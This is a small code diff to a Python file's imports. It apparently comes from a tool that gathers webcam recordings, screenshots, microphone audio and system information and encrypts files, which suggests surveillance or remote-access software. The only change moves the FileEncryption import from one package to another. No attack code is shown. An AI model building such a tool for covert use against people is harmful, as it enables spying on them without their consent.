@@ -4,7 +4,7 @@ from Features.Recordings.Webcamera import Webcamera
 from Features.Screenshots.Screenshot import Screenshot
 from Features.Soundfile.Microphone import Microphone
 from Features.SystemInformation.Sysinfo import SysInfo
-from Features.FileEncryption import FileEncryption
+from Util.FileEncryption import FileEncryption
 
 
 class MainFileException(Exception):
